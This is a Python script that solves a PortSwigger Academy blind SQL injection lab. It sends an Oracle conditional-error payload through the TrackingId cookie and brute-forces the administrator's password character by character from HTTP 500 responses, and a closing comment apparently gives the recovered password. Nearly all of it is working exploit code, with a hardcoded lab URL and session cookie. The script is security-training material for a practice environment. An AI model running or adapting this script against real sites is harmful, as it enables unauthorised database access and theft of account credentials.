import requests   #you have to import the requests library --> pip install requests

""" this script is brute forcing the password of an admin in data base sql injection in portswigger blind sqli lab 11 """

#list containing alphapets&numbers from 0-9
list =['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'
       ,'0','1','2','3','4','5','6','7','8','9']

#from burp extension called (copy as python request) burp0_url,burp0_headers,burp0_cookies
burp0_url = "https://0a940041041eac9a83f37d1c00530099.web-security-academy.net:443/filter?category=Gifts"

burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
                 , "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
                 , "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a97004603ed994e81b8e9c000ad005c.web-security-academy.net/"
                 , "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin"
                 , "Sec-Fetch-User": "?1", "Te": "trailers"}

#the page should return 500 status code to you if the query is right

#brute force
for y in range(1,21): #20 chars of the password
    for i in list:  
        #sql query that return true if  password[y] = i from list
        payload = f"'||+(SELECT+CASE+WHEN+(substr(password,{y},1)='{i}')+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username='administrator')||'+--+" 
        burp0_cookies = {"TrackingId": f"y8bT74wWb5q9zTvE{payload}" # put your TrackingId & session instead
                        ,"session": "tncg8S7OkKksxnb6BrzAM9ym1CW1p2TE"} 
        data=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        if data.status_code==500: #if {Welcome back!} is in response then the query is true
            print(i,end="") #print the litter

#pepq52j9eg28olkjcjf9